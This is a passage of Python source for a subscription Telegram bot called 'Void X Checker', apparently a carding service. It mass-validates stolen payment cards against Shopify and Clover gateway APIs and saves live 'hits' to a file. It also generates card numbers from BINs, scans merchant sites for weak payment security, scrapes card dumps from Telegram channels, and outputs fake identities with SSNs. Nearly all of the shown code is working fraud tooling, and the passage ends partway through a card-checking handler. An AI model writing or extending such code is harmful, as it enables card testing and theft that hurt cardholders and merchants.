    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    

    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        card_start_time = time.time()
                        result = check_shopify_cc(card)
                        
                        # Ensure minimum 10 second delay per card
                        processing_time = time.time() - card_start_time
                        if processing_time < 10:
                            time.sleep(10 - processing_time)
                        
                        results.append(result)
                        
                        total_processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), total_processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Shopify [1$]'
                        })
                        total_processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), total_processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle both /gen and .gen
@bot.message_handler(commands=['gen'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.gen'))
def handle_gen(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    try:
        # Parse command
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Invalid format. Use /gen BIN [COUNT] or .gen BIN [COUNT]")
            return
        
        bin_input = parts[1]
        if len(bin_input) < 6:
            bot.reply_to(message, "❌ Invalid BIN. BIN must be at least 6 digits.")
            return
        
        # Default behavior - show 10 CCs in message if no count specified
        if len(parts) == 2:
            # Get BIN info
            bin_info = get_bin_info(bin_input[:6])
            bank = bin_info.get('bank', 'N/A') if bin_info else 'N/A'
            country_name = bin_info.get('country_name', 'N/A') if bin_info else 'N/A'
            flag = bin_info.get('country_flag', '🌍') if bin_info else '🌍'
            card_type = bin_info.get('type', 'N/A') if bin_info else 'N/A'
            
            status_msg = bot.reply_to(message, "🔄 Generating 10 CCs...")
            
            def generate_inline():
                try:
                    response = requests.get(CC_GENERATOR_URL.format(bin_input, 10))
                    if response.status_code == 200:
                        ccs = response.text.strip().split('\n')
                        formatted_ccs = "\n".join(f"<code>{cc}</code>" for cc in ccs)
                        
                        result = f"""
<pre>Generated 10 CCs 💳</pre>

{formatted_ccs}

<pre>Cards
BIN ➳ {bin_input}
Country ➳ {country_name} {flag}
Type ➳ {card_type}
Bank ➳ {bank}</pre>
"""
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=result,
                                            parse_mode='HTML')
                    else:
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text="❌ Failed to generate CCs. Please try again.")
                except Exception as e:
                    bot.edit_message_text(chat_id=message.chat.id,
                                         message_id=status_msg.message_id,
                                         text=f"❌ Error generating CCs: {str(e)}")
            
            threading.Thread(target=generate_inline).start()
        
        # If count is specified, always generate a file
        else:
            try:
                count = int(parts[2])
                if count <= 0:
                    bot.reply_to(message, "❌ Count must be at least 1")
                    return
                elif count > 5000:
                    count = 5000
                    bot.reply_to(message, "⚠️ Maximum count is 5000. Generating 5000 CCs.")
                
                # Get BIN info
                bin_info = get_bin_info(bin_input[:6])
                bank = bin_info.get('bank', 'N/A') if bin_info else 'N/A'
                country_name = bin_info.get('country_name', 'N/A') if bin_info else 'N/A'
                flag = bin_info.get('country_flag', '🌍') if bin_info else '🌍'
                card_type = bin_info.get('type', 'N/A') if bin_info else 'N/A'
                
                status_msg = bot.reply_to(message, f"🔄 Generating {count} CCs... This may take a moment.")
                
                def generate_file():
                    try:
                        # Generate in chunks to avoid memory issues
                        chunk_size = 100
                        chunks = count // chunk_size
                        remainder = count % chunk_size
                        
                        with open(f'ccgen_{bin_input}.txt', 'w') as f:
                            for _ in range(chunks):
                                response = requests.get(CC_GENERATOR_URL.format(bin_input, chunk_size))
                                if response.status_code == 200:
                                    f.write(response.text)
                                time.sleep(1)  # Be gentle with the API
                            
                            if remainder > 0:
                                response = requests.get(CC_GENERATOR_URL.format(bin_input, remainder))
                                if response.status_code == 200:
                                    f.write(response.text)
                        
                        # Send the file
                        with open(f'ccgen_{bin_input}.txt', 'rb') as f:
                            bot.send_document(message.chat.id, f, caption=f"""
Generated {count} CCs 💳
━━━━━━━━━━━━━━━━━━
BIN ➳ {bin_input}
Country ➳ {country_name} {flag}
Type ➳ {card_type}
Bank ➳ {bank}
━━━━━━━━━━━━━━━━━━
""")
                        
                        # Clean up
                        os.remove(f'ccgen_{bin_input}.txt')
                        bot.delete_message(message.chat.id, status_msg.message_id)
                    
                    except Exception as e:
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=f"❌ Error generating CCs: {str(e)}")
                
                threading.Thread(target=generate_file).start()
            
            except ValueError:
                bot.reply_to(message, "❌ Invalid count. Please provide a number.")
    
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['info'])
def handle_info(message):
    try:
        from datetime import datetime

        # Get user information
        user_id = message.from_user.id
        first_name = message.from_user.first_name
        last_name = message.from_user.last_name if message.from_user.last_name else ""
        username = f"@{message.from_user.username}" if message.from_user.username else "None"
        chat_id = message.chat.id

        # Get subscription info
        is_subscribed = is_user_subscribed(user_id)
        if is_subscribed:
            expiry_date = datetime.strptime(SUBSCRIBED_USERS[str(user_id)]['expiry'], "%Y-%m-%d")
            days_left = (expiry_date - datetime.now()).days
            plan = SUBSCRIBED_USERS[str(user_id)]['plan']
            plan_info = f"✅ Subscribed (Plan {plan}, {days_left} days left)"
            credits_display = "Unlimited"
        else:
            plan_info = "❌ Not subscribed"
            credits = get_remaining_credits(user_id)
            credits_display = f"{credits}/{DAILY_CREDITS}"

        # Get member since date (from message timestamp)
        member_since = datetime.fromtimestamp(message.date).strftime('%Y-%m-%d')

        # Format the response
        response = f"""
┏━━━━━━━⍟
┃ 𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨
┗━━━━━━━━━━━⊛

✧ Name ➳ {first_name} {last_name}
✧ Username ➳ {username}
✧ User ID ➳ <code>{user_id}</code>
✧ Chat ID ➳ <code>{chat_id}</code>
✧ Member Since ➳ <code>{member_since}</code>

✧ Status ➳ <code>{plan_info}</code>
✧ Credits ➳ <code>{credits_display}</code>

✧ Bot By ➳ @spydil
"""
        bot.reply_to(message, response, parse_mode='HTML')

    except Exception as e:
        bot.reply_to(message, f"❌ Error getting user info: {str(e)}")

@bot.message_handler(commands=['ping'])
def handle_ping(message):
    try:
        # Measure ping
        start = time.time()
        sent = bot.send_chat_action(message.chat.id, 'typing')
        end = time.time()
        realping = round((end - start) * 1000)  # in ms

        # Uptime
        uptime_seconds = time.time() - BOT_START_TIME
        uptime_str = str(timedelta(seconds=int(uptime_seconds)))

        # System info
        cpu = psutil.cpu_percent()
        memory = psutil.virtual_memory().percent
        system = platform.system()
        arch = platform.machine()

        # Optional: total users from a stored file or DB
        total_users = len(SUBSCRIBED_USERS) if 'SUBSCRIBED_USERS' in globals() else "Unknown"

        response = f"""
𝑽𝒐𝒊𝒅 𝑿 𝑪𝒉𝒆𝒄𝒌𝒆𝒓 is running...

✧ Ping ➳ <code>{realping} ms</code>
✧ Up Time ➳ <code>{uptime_str}</code>
✧ CPU Usage ➳ <code>{cpu}%</code>
✧ RAM Usage ➳ <code>{memory}%</code>
✧ System ➳ <code>{system} ({arch})</code>

✧ Bot By ➳ @spydil
"""
        bot.reply_to(message, response, parse_mode="HTML")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error getting bot status: {str(e)}")

# /help command with two buttons
@bot.message_handler(commands=['help'])
def handle_help(message):
    markup = types.InlineKeyboardMarkup()
    markup.row_width = 2
    support_button = types.InlineKeyboardButton("🛠 Support", url="https://t.me/voidxsupportbot")
    admin_button = types.InlineKeyboardButton("👤 Admin", url="https://t.me/voidboy336")
    markup.add(support_button, admin_button)

    bot.reply_to(message, "👇 Below is the support available for this bot 👇", reply_markup=markup)

# /credits command to show current user's credits
@bot.message_handler(commands=['credits'])
def handle_credits(message):
    user_id = str(message.from_user.id)
    is_sub = is_user_subscribed(user_id)

    if is_sub:
        bot.reply_to(message, "🌟 You have: <b>Unlimited</b> credits (Subscribed User)", parse_mode='HTML')
    else:
        remaining = get_remaining_credits(user_id)
        bot.reply_to(message, f"🔢 You have: <b>{remaining}</b> credits left today.", parse_mode='HTML')

@bot.message_handler(commands=['myplan'])
def handle_myplan(message):
    user_id = str(message.from_user.id)
    if user_id in SUBSCRIBED_USERS:
        plan_data = SUBSCRIBED_USERS[user_id]
        plan_number = plan_data['plan']
        expiry = plan_data['expiry']

        # Map plan number to name
        plan_names = {
            1: "🟢 Basic Plan",
            2: "🔵 Standard Plan",
            3: "🟣 Premium Plan"
        }

        plan_name = plan_names.get(plan_number, "Unknown Plan")

        response = f"""
┏━━━━━━⍟
┃ Your Current Plan
┗━━━━━━━━━━━━━⊛

✧ Plan Type ➳ <b>{plan_name}</b>
✧ Expiry Date ➳ <code>{expiry}</code>

- Enjoy Unlimited CC Checks & Exclusive Features!
"""
    else:
        response = "❌ You are not subscribed to any plan.\nUse /buy to see available options."

    bot.reply_to(message, response, parse_mode='HTML')

def check_c15_cc(cc):
    try:
        card = cc.replace('/', '|').strip()
        parts = card.split('|')
        if len(parts) < 4:
            return {
                'status': 'ERROR',
                'message': 'Invalid format → CC|MM|YY|CVV',
                'card': card,
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Clover Auth [15$]'
            }

        cc_num, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        yy = yy[-2:] if len(yy) == 4 else yy
        formatted = f"{cc_num}|{mm}|{yy}|{cvv}"

        bin_info = get_bin_info(cc_num[:6])

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json"
        }

        try:
            resp = requests.get(C15_API_URL.format(formatted), headers=headers, timeout=90)

            if resp.status_code != 200:
                return {
                    'status': 'ERROR',
                    'message': f'Gate Blocked/Down ({resp.status_code})',
                    'card': card,
                    **bin_info,
                    'gateway': 'Clover Auth [15$]'
                }

            data = resp.json()

            raw_status = str(data.get('status', 'Dead')).upper()
            response_msg = data.get('response', '')
            notes = data.get('details', {}).get('notes', '') if data.get('details') else ''

            full_msg = response_msg or notes or 'No Response'

            if any(k in raw_status for k in ['LIVE', 'APPROVED', 'CHARGED', 'SUCCESS']):
                status = 'APPROVED'
                with open('HITS.txt', 'a') as f:
                    f.write(card + f' → {full_msg}\n')
            else:
                status = 'DECLINED'

            return {
                'status': status,
                'message': full_msg,
                'card': card,
                **bin_info,
                'gateway': 'Clover Auth [15$]'
            }

        except Exception as e:
            return {
                'status': 'ERROR',
                'message': f'Gate Error → {str(e)}',
                'card': card,
                **bin_info,
                'gateway': 'Clover Auth [15$]'
            }

    except Exception as e:
        return {
            'status': 'ERROR',
            'message': 'Invalid Input',
            'card': cc,
            'gateway': 'Clover Auth [15$]'
        }

@bot.message_handler(commands=['stats'])
def handle_stats(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "You are not authorized to use this command.")
        return

    try:
        total_users = len(set(USER_CREDITS.keys()) | set(SUBSCRIBED_USERS.keys()))
        subscribed_users = len(SUBSCRIBED_USERS)

        today_str = str(datetime.now().date())
        total_checks_today = sum(
            DAILY_CREDITS - data.get("credits", 0)
            for uid, data in USER_CREDITS.items()
            if data.get("date") == today_str
        )

        approved = 0
        if os.path.exists("HITS.txt"):
            with open("HITS.txt", "r") as f:
                approved = len(f.readlines())

        declined = max(0, total_checks_today - approved)

        total_redeemed = sum(
            data.get("redeemed_credits", 0) for data in USER_CREDITS.values()
        )

        response = f"""
┏━━━━━━━⍟
┃ Bot Statics 
┗━━━━━━━━━━━⊛

✧ Total Users       ➳ <code>{total_users}</code>
✧ Subscribed Users  ➳ <code>{subscribed_users}</code>
✧ Checks Today      ➳ <code>{total_checks_today}</code>
✧ Approved Cards    ➳ <code>{approved}</code>
✧ Declined Cards    ➳ <code>{declined}</code>
✧ Redeemed Credits  ➳ <code>{total_redeemed}</code>
"""
        bot.reply_to(message, response.strip(), parse_mode='HTML')

    except Exception as e:
        bot.reply_to(message, f"Error fetching stats: {str(e)}")

@bot.message_handler(commands=['gate'])
def handle_gate_check(message):
    user_id = str(message.from_user.id)

    # Restrict usage in private DMs for non-subscribed users
    if message.chat.type == 'private' and user_id not in ADMIN_IDS and not is_user_subscribed(user_id):
        bot.reply_to(message, "❌ This bot is restricted in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return

    # Restrict usage in unapproved groups
    if message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.\nSend group username & chat ID to @spydil to get approved.")
        return

    # Check for URL argument
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /gate <site_url>")
        return

    site_url = parts[1].strip()

    try:
        # Send initial message
        status_msg = bot.reply_to(message, f"Checking URL: <code>{site_url}</code>\nProgress: □□□□□ (0%)\nPlease wait...", parse_mode="HTML")

        # Progress bar simulation (safe updates)
        progress_steps = ["□□□□□ (0%)", "■□□□□ (20%)", "■■□□□ (40%)", "■■■□□ (60%)", "■■■■□ (80%)", "■■■■■ (100%)"]
        last_text = ""

        for progress in progress_steps:
            new_text = f"Checking URL: <code>{site_url}</code>\nProgress: {progress}\nPlease wait..."
            if new_text != last_text:
                try:
                    bot.edit_message_text(chat_id=message.chat.id,
                                          message_id=status_msg.message_id,
                                          text=new_text,
                                          parse_mode="HTML")
                    last_text = new_text
                except Exception as edit_error:
                    print(f"[Progress Edit Skipped] {edit_error}")
            time.sleep(0.6)

        # Call external API
        api_url = f"https://gatefinder-dark-stormx.onrender.com/gatechk?site={site_url}"
        response = requests.get(api_url, timeout=300)

        if response.status_code != 200:
            bot.edit_message_text(chat_id=message.chat.id,
                                  message_id=status_msg.message_id,
                                  text=f"❌ Failed to check the site.\nStatus Code: {response.status_code}\nResponse: {response.text[:200]}",
                                  parse_mode=None)  # Use plain text for error
            return

        try:
            data = response.json()
        except ValueError:
            bot.edit_message_text(chat_id=message.chat.id,
                                  message_id=status_msg.message_id,
                                  text="❌ Error: Invalid JSON response received from the gatefinder API.",
                                  parse_mode="HTML")
            return

        # Extract values
        gateways = ", ".join(data.get("payment_gateways", ["N/A"]))
        captcha = ", ".join(data.get("captcha", ["N/A"]))
        cloudflare = data.get("cloudflare", "N/A")
        cvv = data.get("cvv_cvc_status", "N/A")
        inbuilt = data.get("inbuilt_system", "N/A")
        security = data.get("security", "N/A")
        status_code = data.get("status_code", "N/A")
        final_url = data.get("url", site_url)

        # Format final result
        result = f"""
┏━━━━━━━⍟
┃ 𝗟𝗼𝗼𝗸𝘂𝗽 𝗥𝗲𝘀𝘂𝗹𝘁  ✅ 
┗━━━━━━━━━━━━⊛
─━─━─━─━─━─━─━─━─━─
✧ 𝗦𝗶𝘁𝗲 ➳ <code>{final_url}</code> 
✧ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 ➳ <code>{gateways}</code> 
✧ 𝗖𝗮𝗽𝘁𝗰𝗵𝗮 ➳ <code>{captcha}</code> 
✧ 𝗖𝗹𝗼𝘂𝗱𝗳𝗹𝗮𝗿𝗲 ➳ <code>{cloudflare}</code> 
✧ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 ➳ {security}
✧ 𝗖𝗩𝗩/𝗖𝗩𝗖 ➳ {cvv}
✧ 𝗜𝗻𝗯𝘂𝗶𝗹𝘁 𝗦𝘆𝘀𝘁𝗲𝗺 ➳ {inbuilt}
✧ 𝗦𝘁𝗮𝘁𝘂𝘀 ➳ {status_code}
─━─━─━─━─━─━─━─━─━─
"""
        bot.edit_message_text(chat_id=message.chat.id,
                              message_id=status_msg.message_id,
                              text=result.strip(),
                              parse_mode='HTML')

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['fake'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.fake'))
def handle_fake(message):
    # Restrict usage in DMs for non-subs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is locked in DMs. Join our group @voidxup or subscribe to use it in private.")
        return

    # Restrict usage in unapproved groups
    if message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.\nSend @spydil the group username and chat ID to get approved.")
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "❌ Usage: /fake <country_code>\nExample: /fake us, .fake in")
        return

    code = parts[1].strip().lower()

    # Match locale or fallback to US
    matched_locale = None
    for locale in AVAILABLE_LOCALES:
        if locale.lower().endswith(f"_{code}") or locale.lower() == code:
            matched_locale = locale
            break

    if not matched_locale:
        matched_locale = "en_US"
        code = "us"

    fake = Faker(matched_locale)

    try:
        name = fake.name()
        street = fake.street_address()
        city = fake.city()
        state = fake.state() if hasattr(fake, 'state') else "N/A"
        state_abbr = fake.state_abbr() if hasattr(fake, 'state_abbr') else "N/A"
        country = matched_locale.upper()
        zip_code = fake.postcode() if hasattr(fake, 'postcode') else "N/A"
        email = fake.email()
        phone = fake.phone_number()
        dob = fake.date_of_birth(minimum_age=18, maximum_age=60)
        company = fake.company()
        job = fake.job()
        ssn = fake.ssn() if hasattr(fake, 'ssn') else fake.bothify(text='???-##-####')
        ip = fake.ipv4()
        username = fake.user_name()
        password = fake.password(length=10, special_chars=True, digits=True, upper_case=True, lower_case=True)
        website = fake.url()
        address2 = fake.secondary_address() if hasattr(fake, 'secondary_address') else "N/A"
        device = fake.android_platform_token()
        user_agent = fake.user_agent()
        national_id = fake.bothify(text='##??##?####')
        cc_number = fake.credit_card_number()

        # PAN Number for Indian users
        pan_number = fake.bothify(text='?????####?').upper() if code == "in" else "N/A"

        msg = f"""
┏━━━━━━━⍟
┃ Fake Identity 
┗━━━━━━━━━━━⊛

✧ Name      ➳ <code>{name}</code>
✧ Street    ➳ <code>{street}</code>
✧ Address 2 ➳ <code>{address2}</code>
✧ City      ➳ <code>{city}</code>
✧ State     ➳ <code>{state}</code> (<code>{state_abbr}</code>)
✧ Country   ➳ <code>{country}</code>
✧ ZIP Code  ➳ <code>{zip_code}</code>

✧ Email     ➳ <code>{email}</code>
✧ Phone     ➳ <code>{phone}</code>
✧ DOB       ➳ <code>{dob}</code>
✧ Company   ➳ <code>{company}</code>
✧ Job Title ➳ <code>{job}</code>
✧ SSN/ID    ➳ <code>{ssn}</code>
✧ National ID ➳ <code>{national_id}</code>
✧ IP Address  ➳ <code>{ip}</code>

✧ Username  ➳ <code>{username}</code>
✧ Password  ➳ <code>{password}</code>
✧ Website   ➳ <code>{website}</code>

✧ Credit Card ➳ <code>{cc_number}</code>
✧ PAN Number  ➳ <code>{pan_number}</code>

✧ Device Name ➳ <code>{device}</code>
✧ User-Agent  ➳ <code>{user_agent}</code>
"""
        bot.reply_to(message, msg.strip(), parse_mode="HTML")

    except Exception as e:
        bot.reply_to(message, f"❌ Error generating identity: {str(e)}")

# Handle both /addadmin and .addadmin
@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    if str(message.from_user.id) != ADMIN_IDS[0]:  # Only owner
        return bot.reply_to(message, "❌ Only the bot owner can add admins.")

    parts = message.text.split()
    if len(parts) != 2:
        return bot.reply_to(message, "❌ Usage: /addadmin user_id")

    new_admin = parts[1]
    if new_admin in ADMIN_IDS:
        return bot.reply_to(message, f"⚠️ User <code>{new_admin}</code> is already an admin.", parse_mode='HTML')

    ADMIN_IDS.append(new_admin)
    save_admins()
    bot.reply_to(message, f"✅ Added <code>{new_admin}</code> as admin.", parse_mode='HTML')

@bot.message_handler(commands=['remadmin'])
def remove_admin(message):
    if str(message.from_user.id) != ADMIN_IDS[0]:  # Only owner
        return bot.reply_to(message, "❌ Only the bot owner can remove admins.")

    parts = message.text.split()
    if len(parts) != 2:
        return bot.reply_to(message, "❌ Usage: /remadmin user_id")

    target_admin = parts[1]
    if target_admin == ADMIN_IDS[0]:
        return bot.reply_to(message, "❌ You cannot remove the owner.")

    if target_admin not in ADMIN_IDS:
        return bot.reply_to(message, "❌ This user is not an admin.")

    ADMIN_IDS.remove(target_admin)
    save_admins()
    bot.reply_to(message, f"✅ Removed <code>{target_admin}</code> from admin list.", parse_mode='HTML')


@bot.message_handler(commands=['listsub'])
def list_subscribers(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        return bot.reply_to(message, "❌ You are not authorized to use this command.")

    if not SUBSCRIBED_USERS:
        return bot.reply_to(message, "❌ No active subscribers found.")

    msg = "<b>📋 Active Subscribers:</b>\n\n"

    for user_id, data in SUBSCRIBED_USERS.items():
        plan = data.get('plan', '❓')
        expiry = data.get('expiry', '❌')
        credits = USER_CREDITS.get(user_id, {}).get('credits', 0)
        total_redeemed = USER_CREDITS.get(user_id, {}).get('redeemed_credits', 0)

        msg += (
            f"👤 <code>{user_id}</code>\n"
            f"• Plan: {plan} | Expiry: {expiry}\n"
            f"• Credits: {credits} | Redeemed: {total_redeemed}\n\n"
        )

    bot.reply_to(message, msg, parse_mode='HTML')

@bot.message_handler(commands=['admins'])
def list_admins(message):
    if str(message.from_user.id) != "7098912960":
        bot.reply_to(message, "❌ Only the bot owner can see full admin list.")
        return

    if not ADMIN_IDS:
        bot.reply_to(message, "No admins found.")
        return

    admin_list = "\n".join([f"• <code>{uid}</code>" for uid in ADMIN_IDS])
    bot.reply_to(message, f"👮 Current Admins:\n\n{admin_list}", parse_mode="HTML")


def extract_ccs(text):
    cc_pattern = r'\b(?:\d[ -]*?){13,16}[|:/\- ]\d{1,2}[|:/\- ]\d{2,4}[|:/\- ]\d{3,4}\b'
    matches = re.findall(cc_pattern, text)
    cleaned = []

    for match in matches:
        nums = re.split(r'[|:/\- ]+', match)
        if len(nums) == 4:
            cc, mm, yy, cvv = nums
            if len(yy) == 2:
                yy = "20" + yy
            cleaned.append(f"{cc}|{mm}|{yy}|{cvv}")
    return cleaned

@bot.message_handler(commands=['fl'])
def format_list(message):
    target_text = message.text

    # If replying to message, extract that instead
    if message.reply_to_message:
        target_text = message.reply_to_message.text

    ccs = extract_ccs(target_text)
    if not ccs:
        bot.reply_to(message, "❌ No valid CCs found.")
        return

    formatted = "\n".join(ccs)
    count = len(ccs)

    msg = f"✅ Extracted {count} card(s):\n\n<code>{formatted}</code>"
    bot.reply_to(message, msg, parse_mode="HTML")



@bot.message_handler(commands=['scr'])
@bot.message_handler(func=lambda message: message.text.startswith('.scr'))
def handle_scrape_cards(message):
    try:
        chat_id = message.chat.id
        from_id = str(message.from_user.id)

        # Restrict usage to:
        # → Subscribed users in DMs
        # → Approved groups
        if message.chat.type == "private":
            if from_id not in SUBSCRIBED_USERS:
                return bot.reply_to(message, "❌ This command is only for subscribed users in DM.")
        elif message.chat.type in ["group", "supergroup"]:
            if str(chat_id) not in APPROVED_GROUPS:
                return bot.reply_to(message, "❌ This group is not approved to use this command.")
        else:
            return bot.reply_to(message, "❌ This command is not allowed here.")

        # Parse args
        parts = message.text.split()
        if len(parts) != 3:
            return bot.reply_to(message, "❌ Usage: /scr username count\nExample: <code>/scr inkbins 100</code>", parse_mode='HTML')

        username = parts[1]
        try:
            count = int(parts[2])
        except ValueError:
            return bot.reply_to(message, "❌ Count must be a number.")

        if count > 5000:
            return bot.reply_to(message, "❌ Max card limit is 5000.")

        # "Please wait" status
        status_msg = bot.reply_to(message, "⏳ Scraping cards, please wait up to 2 minutes...")

        # API request
        url = f"https://scrapper-void-1.onrender.com/key=void/uname/{username}/{count}"
        response = requests.get(url, timeout=300)

        if response.status_code != 200:
            return bot.edit_message_text("❌ Failed to fetch data from the server.", chat_id=chat_id, message_id=status_msg.message_id)

        data = response.json()
        cc_list = data.get('cc_list', [])
        channel = data.get('channel', 'Unknown')
        total_found = data.get('total_found', 0)
        unique_ccs = data.get('unique_ccs', 0)
        duplicates = data.get('duplicates_found', 0)
        scraped = data.get('messages_scraped', 0)

        if not cc_list:
            return bot.edit_message_text("❌ No cards found.", chat_id=chat_id, message_id=status_msg.message_id)

        # Save cards to file
        filename = f"scraped_{username}_{from_id}.txt"
        with open(filename, 'w') as file:
            for cc in cc_list:
                file.write(cc + '\n')

        # Caption
        caption = (
            f"✅ <b>Scrape Complete</b>\n"
            f"👤 Username: <code>{username}</code>\n"
            f"📦 Cards: <b>{len(cc_list)}</b>\n"
            f"💬 Messages Scraped: <b>{scraped}</b>\n"
            f"♻️ Duplicates Removed: <b>{duplicates}</b>\n"
            f"🌐 Source: <code>{channel}</code>\n"
            f"🧮 Total Found: <b>{total_found}</b>\n"
            f"🆕 Unique CCs: <b>{unique_ccs}</b>"
        )

        # Send file
        with open(filename, 'rb') as doc:
            bot.send_document(
                chat_id=chat_id,
                document=doc,
                caption=caption,
                parse_mode='HTML',
                reply_to_message_id=message.message_id
            )

        os.remove(filename)
        bot.delete_message(chat_id=chat_id, message_id=status_msg.message_id)

    except Exception as e:
        try:
            bot.edit_message_text(f"❌ Error occurred: {str(e)}", chat_id=chat_id, message_id=status_msg.message_id)
        except:
            bot.reply_to(message, f"❌ Error occurred: {str(e)}")

def normalize_card_input(cc):
    parts = re.split(r'[|:/\- ]+', cc)
    if len(parts) < 4:
        raise ValueError("Invalid card format")
    card, mm, yy, cvv = parts[:4]
    if len(yy) == 2:
        yy = "20" + yy
    return f"{card}|{mm}|{yy}|{cvv}"


@bot.message_handler(commands=['au'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.au'))
def handle_au(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now.")
        return

    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands.")
        return

    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ No credits left. Remaining: {remaining}.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Format: /au CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:
            cc = message.text[4:].strip()

        cc = normalize_card_input(cc)

        start_time = time.time()
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

